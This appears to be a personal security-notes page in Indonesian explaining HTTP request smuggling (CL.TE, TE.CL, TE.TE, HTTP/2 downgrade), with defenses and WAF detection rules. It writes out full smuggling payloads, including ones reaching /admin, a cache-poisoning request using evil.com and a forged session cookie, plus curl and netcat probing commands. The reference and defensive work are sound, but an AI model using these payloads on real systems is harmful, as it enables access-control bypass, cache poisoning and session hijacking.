---
title: "Request Smuggling — HTTP/1.1 & HTTP/2 Attack: CL.TE, TE.CL, TE.TE, Downgrade, Defense"
tags:
  - cyber-security
  - request-smuggling
  - http
  - web-security
  - waf-bypass
  - library
aliases:
  - "HTTP Request Smuggling Complete Guide"
  - "CL.TE TE.CL Smuggling"
created: "2026-07-28"
updated: "2026-07-28"
status: pending
cssclasses:
  - wide-table
---

> [!info] Ringkasan
> HTTP Request Smuggling adalah teknik exploitasi perbedaan interpretasi HTTP request antara frontend (proxy/WAF/load balancer) dan backend (application server). Dengan memanfaatkan parsing inconsistencies, attacker bisa menyelundupkan request yang tidak terdeteksi WAF namun diproses backend. Serangan ini bisa menyebabkan session hijacking, cache poisoning, dan account takeover.

**Cross-link:** [[waf-reverse-proxy-deepdive]] → [[api-security-deep-dive]] → [[web-security]] → [[ids-ips-waf-nsm-comparison]]

---

## Daftar Isi
- [[#1. Root Cause: Parsing Inconsistency]]
- [[#2. CL.TE — Content-Length vs Transfer-Encoding]]
- [[#3. TE.CL — Transfer-Encoding vs Content-Length]]
- [[#4. TE.TE — Obfuscated Transfer-Encoding]]
- [[#5. HTTP/2 Downgrade Smuggling]]
- [[#6. Impact & Exploitation]]
- [[#7. Detection Techniques]]
- [[#8. Defense Strategy]]
- [[#9. jarsWAF Detection Rules]]
- [[#10. Referensi]]

---

## 1. Root Cause: Parsing Inconsistency

```
┌──────────┐     CL=13     ┌──────────┐     TE      ┌─────────┐
│  Client  │ ─────────────▶│   WAF/   │ ───────────▶│  Backend│
│          │               │  Proxy   │              │(Apache) │
└──────────┘               └──────────┘              └─────────┘
                              CL priority             TE priority
```

Ketika frontend dan backend menggunakan header yang berbeda untuk menentukan panjang body request, smuggling terjadi.

### Perilaku Server

| Server | Priority | Prefix |
|---|---|---|
| Apache HTTPD | Transfer-Encoding | TE |
| Tomcat | Content-Length | CL |
| Nginx | Content-Length | CL |
| IIS | Transfer-Encoding | TE |
| HAProxy | Transfer-Encoding | TE |
| NetScaler | Transfer-Encoding | TE |

---

## 2. CL.TE — Content-Length vs Transfer-Encoding

Frontend (CL-based) dan backend (TE-based).

### Payload

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 44
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: internal
X-Ignore: X
```

**Cara kerja:**
1. **Frontend** (CL-based): lihat Content-Length: 44 → baca 44 bytes → body adalah semua setelah `chunked` → forward sebagai 1 request
2. **Backend** (TE-based): lihat Transfer-Encoding: chunked → parse `0` (end of chunk)

---

## 3. TE.CL — Transfer-Encoding vs Content-Length

Frontend (TE-based) dan backend (CL-based).

### Payload

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked

5c
POST /admin HTTP/1.1
Host: internal
Content-Length: 15

x=1
0
```

**Cara kerja:**
1. **Frontend** (TE): parse chunk → `5c` (92 bytes) adalah semua termasuk request kedua → forward sebagai 1 request
2. **Backend** (CL): lihat Content-Length: 4 → baca 4 bytes (`5c\r\n`) saja → sisanya dianggap request baru

---

## 4. TE.TE — Obfuscated Transfer-Encoding

Frontend dan backend sama-sama TE-based, tapi cara parse header TE berbeda.

### Obfuscation Techniques

```http
# Case toggling
Transfer-Encoding: Chunked
transfer-encoding: chunked
Transfer-Encoding: CHUNKED

# Extra characters
Transfer-Encoding: chunked\r\nTransfer-Encoding: identity
Transfer-Encoding:    chunked     # trailing spaces
Transfer-Encoding: \x00chunked    # null byte
Transfer-Encoding: xchunked       # "x" prefix → ignored oleh beberapa server

# Multiple headers
Transfer-Encoding: chunked
Transfer-Encoding: x

# Header folding (deprecated)
Transfer-Encoding: chunked\r\n chunked
```

### Payload

```http
POST / HTTP/1.1
Host: target.com
Transfer-Encoding: xchunked
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: internal
```

**Cara kerja:**
1. **Frontend**: lihat `xchunked` → ignore (tidak kenal) → tidak ada chunk processing
2. **Backend**: lihat `chunked` → parse chunk → `0` akhir chunk → request berikutnya adalah `GET /admin`

---

## 5. HTTP/2 Downgrade Smuggling

### H2.TE Smuggling

HTTP/2 tidak menggunakan Transfer-Encoding. Tapi saat frontend HTTP/2 mendowngrade ke HTTP/1.1 untuk backend, smuggling bisa terjadi.

```http
HEADERS
:method = POST
:path = /
:authority = target.com
content-length = 0

DATA
POST / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: internal
```

**Cara kerja:**
1. **Frontend** (HTTP/2): parse stream → forward ke backend via HTTP/1.1
2. **Backend** (HTTP/1.1): melihat `Transfer-Encoding: chunked` → parse chunk
3. Smuggled request tereksekusi

### H2.CL Smuggling

HTTP/2 body dihitung dari DATA frame length, bukan Content-Length. Tapi saat downgrade, frontend bisa menambahkan Content-Length header yang tidak cocok.

---

## 6. Impact & Exploitation

| Impact | Teknik | Contoh |
|---|---|---|
| **Session hijacking** | Smuggle request yang mencuri cookie | User request + Attacker request dalam 1 koneksi |
| **Cache poisoning** | Smuggle request yang mencemari cache | Frontend cache menyimpan response attacker sebagai halaman legitimate |
| **WAF bypass** | Smuggle attack payload yang tidak melewati WAF | WAF hanya lihat request pertama, request kedua adalah attack |
| **Account takeover** | Smuggle credential reset | Request ke internal endpoint admin |

### Cache Poisoning via Smuggling

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 51
Transfer-Encoding: chunked

0

GET /static/poison.css HTTP/1.1
Host: evil.com
X-Ignore: X
```

Jika cache menyimpan response dari `GET /static/poison.css` (yang sebenarnya dari evil.com), semua user yang request CSS legitimate akan menerima CSS jahat.

### Session Hijacking

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 100
Transfer-Encoding: chunked

0

GET /profile HTTP/1.1
Host: target.com
Cookie: session=HACKED

```

---

## 7. Detection Techniques

### Timing-Based Detection

```bash
# CL.TE test — jika timing berbeda, rentan
# Request A: harusnya return cepat (0 chunk end)
time curl -v -p http://target.com \
  -H "Transfer-Encoding: chunked" \
  -d "0\r\n\r\n"

# Request B: harusnya delay/error jika ada smuggling
time curl -v -p http://target.com \
  -H "Content-Length: 100" \
  -H "Transfer-Encoding: chunked" \
  -d "0\r\n\r\n"
```

### Response Differencing

```bash
# Kirim dua request cepat dalam 1 koneksi
# Jika response kedua terpengaruh → ada smuggling
echo -e "POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 44\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /404 HTTP/1.1\r\n\r\n" | nc target.com 80
```

### Tool Detection

| Tool | Fungsi |
|---|---|
| **Burp Suite** | HTTP Request Smuggler extension (PortSwigger) |
| **Smuggler.py** | Auto-detect CL.TE, TE.CL, TE.TE |
| **Python custom** | Kirim raw HTTP via socket |

---

## 8. Defense Strategy

| Fix | Implementasi | Efektivitas |
|---|---|---|
| **HTTP/2 only** | Backend hanya terima HTTP/2 | Sangat tinggi |
| **Normalize TE header** | Reject/malformed TE headers | Tinggi |
| **Reject ambiguous request** | Jika CL + TE ada → 400 Bad Request | Tinggi |
| **Frontend-backend konsisten** | Samakan parser behavior | Sangat tinggi |
| **Disable HTTP/1.1 downgrade** | Jangan downgrade HTTP/2 ke HTTP/1.1 | Tinggi |
| **WAF rule** | BLOCK jika ada CL + TE bersamaan | Sedang (SMUGGLE-001) |

### Implementasi: Reject Ambiguous

```javascript
// Middleware: jika ada Content-Length AND Transfer-Encoding → reject
function checkSmuggling(req, res, next) {
  const cl = req.headers['content-length'];
  const te = req.headers['transfer-encoding'];
  if (cl && te && te.toLowerCase().includes('chunked')) {
    return res.status(400).send('Bad Request');
  }
  next();
}
```

### Implementasi: Normalize TE

```javascript
// Hanya terima satu nilai TE yang valid
const VALID_TE = ['chunked', 'identity'];
function validateTE(te) {
  const normalized = te.toLowerCase().replace(/\s/g, '');
  return VALID_TE.includes(normalized) ? normalized : null;
}
```

---

## 9. jarsWAF Detection Rules

Sudah ada at SMUGGLE-001 dan SMUGGLE-002 di `body.rs`.

```rust
// SMUGGLE-001: CL + TE bersamaan → HTTP Request Smuggling
fn check_smuggle_001(req: &RequestInfo) -> bool {
    let cl = req.headers.contains_key("content-length");
    let te = req.headers.get("transfer-encoding")
        .map(|v| v.contains("chunked"))
        .unwrap_or(false);
    cl && te
}

// SMUGGLE-002: HTTP/2 pseudo-headers di HTTP/1.1
fn check_smuggle_002(req: &RequestInfo) -> bool {
    req.headers.contains_key(":authority")
        || req.headers.contains_key(":method")
        || req.headers.contains_key(":path")
        || req.headers.contains_key(":scheme")
}
```

**Lokasi payload:** `/mnt/data_d/Projects/Reference/PayloadsAllTheThings/Request Smuggling/`

---

## 10. Referensi

- PortSwigger Research: [HTTP Request Smuggling](https://portswigger.net/web-security/request-smuggling)
- PayloadsAllTheThings: `/mnt/data_d/Projects/Reference/PayloadsAllTheThings/Request Smuggling/`
- OWASP CRS: `/mnt/data_d/Projects/Reference/owasp-coreruleset/rules/REQUEST-921-PROTOCOL-ATTACK.conf`

**Cross-link vault:**
- [[waf-reverse-proxy-deepdive]] — WAF arsitektur
- [[api-security-deep-dive]] — API keamanan
- [[web-security]] — web security umum
- [[ids-ips-waf-nsm-comparison]] — perbandingan security tools
